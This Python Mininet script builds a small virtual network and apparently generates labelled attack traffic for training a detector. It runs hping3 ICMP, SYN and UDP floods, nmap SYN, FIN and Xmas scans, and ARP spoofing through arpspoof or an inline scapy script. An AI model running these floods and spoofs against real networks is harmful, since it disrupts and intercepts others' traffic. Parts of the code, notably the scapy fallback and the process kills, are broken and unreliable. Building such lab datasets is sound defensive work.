#!/usr/bin/env python3
"""
mininet_run_custom.py
Creates a simple topology and runs:
 - benign traffic (ping, iperf, HTTP)
 - ARP spoof (scapy fallback) or arpspoof if available
 - ICMP flood (hping3)
 - TCP SYN flood (hping3)
 - UDP flood (hping3)
 - Port scans (nmap: SYN, FIN, Xmas)
Writes attack_schedule.json for controller labeling.
"""
from mininet.net import Mininet
from mininet.node import OVSSwitch, RemoteController
from mininet.link import TCLink
from mininet.log import setLogLevel, info
import time, json, os
import subprocess

# Attack parameters (timings are relative to start_ts)
ATTACKS = [
    ("icmp_flood", 15, 10),    # (name, offset, duration)
    ("tcp_syn_flood", 30, 10),
    ("udp_flood", 50, 10),
    ("port_scan", 70, 8),
    ("arp_spoof", 90, 10)
]

ATTACK_SCHEDULE_FILE = "attack_schedule.json"

def write_schedule(start_ts):
    intervals = []
    for name, offset, dur in ATTACKS:
        s = int(start_ts + offset)
        e = s + dur
        intervals.append([s, e])
    with open(ATTACK_SCHEDULE_FILE, "w") as f:
        json.dump(intervals, f)
    info("Wrote attack_schedule.json: %s\n", intervals)
    return intervals

def run_attacks(net, intervals):
    h1 = net.get('h1')
    h2 = net.get('h2')
    info("*** Start benign traffic: ping and iperf\n")
    # start iperf server on h2 (TCP)
    h2.cmd("iperf -s > /tmp/iperf_server.log 2>&1 &")
    # http server on h2
    h2.cmd("python3 -m http.server 8000 > /tmp/http_server.log 2>&1 &")
    # continuous pings
    h1.cmd("ping 10.0.0.2 -i 0.5 > /tmp/h1_ping.log 2>&1 &")

    # iterate over attack windows and run each attack during its slot
    for idx, (name, offset, dur) in enumerate(ATTACKS):
        start = int(time.time())
        target_start = intervals[idx][0]
        wait = target_start - start
        if wait > 0:
            info("Waiting %s s until %s\n", wait, name)
            time.sleep(wait)

        info("*** Running attack: %s for %s seconds\n", name, dur)
        if name == "icmp_flood":
            # hping3 icmp flood from h2 -> h1
            h2.cmd(f"hping3 --icmp --flood 10.0.0.1 > /tmp/{name}.log 2>&1 &")
            time.sleep(dur)
            h2.cmd("pkill -f hping3 || true")
        elif name == "tcp_syn_flood":
            h2.cmd(f"hping3 --syn --flood 10.0.0.1 > /tmp/{name}.log 2>&1 &")
            time.sleep(dur)
            h2.cmd("pkill -f hping3 || true")
        elif name == "udp_flood":
            h2.cmd(f"hping3 --udp --flood -s 53 10.0.0.1 > /tmp/{name}.log 2>&1 &")
            time.sleep(dur)
            h2.cmd("pkill -f hping3 || true")
        elif name == "port_scan":
            # run a few nmap scans from h2 to h1
            # SYN scan
            h2.cmd(f"nmap -sS -p 1-1024 10.0.0.1 -oN /tmp/nmap_sS.log &")
            time.sleep(3)
            # FIN scan
            h2.cmd(f"nmap -sF -p 1-1024 10.0.0.1 -oN /tmp/nmap_sF.log &")
            time.sleep(3)
            # Xmas scan
            h2.cmd(f"nmap -sX -p 1-1024 10.0.0.1 -oN /tmp/nmap_sX.log &")
            time.sleep(dur-6)
            h2.cmd("pkill -f nmap || true")
        elif name == "arp_spoof":
            # prefer arpspoof if installed, else use a scapy-based quick spoof implemented inline
            if shutil.which("arpspoof"):
                # redirect arpspoof: attacker (h2) spoofs h1's gateway entry
                h2.cmd(f"arpspoof -i {h2.defaultIntf()} 10.0.0.1 > /tmp/arpspoof.log 2>&1 &")
                time.sleep(dur)
                h2.cmd("pkill -f arpspoof || true")
            else:
                # simple scapy script to send forged ARP replies periodically
                scapy_script = f"""
                from scapy.all import *
                import time

                victim = '10.0.0.1'
                gateway = '10.0.0.254'
                att_mac = '{h2.MAC()}'

                for _ in range(int(dur * 4)):
                    arp_reply = ARP(op=2, pdst=victim, psrc=gateway, hwsrc=att_mac)
                    send(arp_reply, verbose=False)
                    time.sleep(0.25)
                """

                h2.cmd(f"python3 -c \"{scapy_script}\" > /tmp/arp_spoof_scapy.log 2>&1 &")
                time.sleep(dur)
                h2.cmd("pkill -f python3 || true")
        info("*** Finished attack: %s\n" % name)
        # little cool-down before next attack
        time.sleep(2)

def main():
    setLogLevel('info')
    net = Mininet(controller=RemoteController, link=TCLink, switch=OVSSwitch, autoSetMacs=True)
    c0 = net.addController('c0', ip='127.0.0.1', port=6633)
    s1 = net.addSwitch('s1', protocols='OpenFlow13')
    h1 = net.addHost('h1', ip='10.0.0.1/24')
    h2 = net.addHost('h2', ip='10.0.0.2/24')
    net.addLink(h1, s1, bw=10)
    net.addLink(h2, s1, bw=10)
    net.start()
    start_ts = time.time()
    intervals = write_schedule(start_ts)
    run_attacks(net, intervals)
    info("*** Stopping network\n")
    net.stop()

if __name__ == "__main__":
    import shutil
    main()
